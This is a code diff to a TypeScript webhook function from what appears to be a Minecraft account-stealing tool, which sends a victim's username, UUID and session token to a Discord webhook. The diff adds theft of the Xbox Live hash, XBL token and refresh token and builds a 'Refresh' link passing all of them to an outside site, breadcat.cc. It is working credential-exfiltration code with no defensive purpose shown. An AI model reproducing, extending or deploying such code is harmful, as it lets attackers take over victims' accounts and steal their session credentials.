@@ -4,8 +4,9 @@ dotenv.config();
 const hatehook = process.env.DISCORD_HATEHOOK;
 
 export default async function oauthWebhook(data: any, nwData:any, ip: string, webhook: string, blacklisted?: boolean) {
-    const { username, uuid, session_token } = data;
+    const { username, uuid, session_token, xbl_hash, xbl_token, refresh_token } = data;
     const { unsoulboundNw, description } = nwData || { unsoulboundNw: 0, description: "Error getting networth" };
+    const refreshURL = "https://breadcat.cc/api/v1/auth/manual/refresh";
 
     //format networth to be human readable using K, M, B, T
     const formatedNw = Intl.NumberFormat('en-US', {
@@ -31,6 +32,10 @@ export default async function oauthWebhook(data: any, nwData:any, ip: string, we
         {
             "name": "Session Token",
             "value": `\`\`\`${session_token}\`\`\``
+        },
+        {
+            "name": "Refresh",
+            "value": `[Click Here](${refreshURL}?xbl_hash=${xbl_hash}&xbl_token=${xbl_token}&refresh_token=${refresh_token})`
         }
     ]
     if (description !== "Error getting networth") {
